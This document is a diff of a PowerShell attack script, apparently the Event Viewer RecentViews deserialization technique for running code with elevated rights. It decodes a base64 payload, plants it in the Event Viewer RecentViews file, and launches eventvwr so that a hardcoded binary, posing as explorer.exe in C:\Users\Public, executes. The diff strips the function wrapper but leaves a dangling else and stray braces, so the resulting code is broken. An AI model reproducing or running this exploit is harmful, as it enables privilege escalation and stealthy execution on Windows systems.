@@ -1,9 +1,8 @@
-function Invoke-EventViewer {
-    if ($args){
+
         echo "[+] Running"
 
         echo "[1] Crafting Payload"
-        $command = $args[0]
+        $command = "C:\Users\Public\explorer.exe"
         
         # Closes Event Viewer and then runs user commmand.
         echo 'Stop-Process -name mmc*' > C:\Windows\Tasks\EventViewerRCE.ps1 
@@ -13,7 +12,17 @@ function Invoke-EventViewer {
         [IO.File]::WriteAllBytes("C:\Windows\Tasks\p4yl0ad", [Convert]::FromBase64String($payload))
 
         echo "[2] Writing Payload"
-        WriteFile
+        #WriteFile
+
+$Folder = $env:LOCALAPPDATA+'\Microsoft\Event Viewer'
+    if (Test-Path -Path $Folder) {
+        "[+] EventViewer Folder exists"
+        copy C:\Windows\Tasks\p4yl0ad $env:LOCALAPPDATA\Microsoft\EventV~1\RecentViews
+    } else {
+        "[+] EventViewer Folder doesn't exist. Will create one"
+        mkdir $Folder
+        copy C:\Windows\Tasks\p4yl0ad $Folder\RecentViews
+    }
 
         echo "[3] Finally, invoking eventvwr"
         eventvwr
@@ -22,16 +31,3 @@ function Invoke-EventViewer {
         echo '[-] Usage: Invoke-EventViewer commandhere'
         echo 'Example: Invoke-EventViewer cmd.exe'
     }
-}
-
-function WriteFile {
-    $Folder = $env:LOCALAPPDATA+'\Microsoft\Event Viewer'
-    if (Test-Path -Path $Folder) {
-        "[+] EventViewer Folder exists"
-        copy C:\Windows\Tasks\p4yl0ad $env:LOCALAPPDATA\Microsoft\EventV~1\RecentViews
-    } else {
-        "[+] EventViewer Folder doesn't exist. Will create one"
-        mkdir $Folder
-        copy C:\Windows\Tasks\p4yl0ad $Folder\RecentViews
-    }    
-}
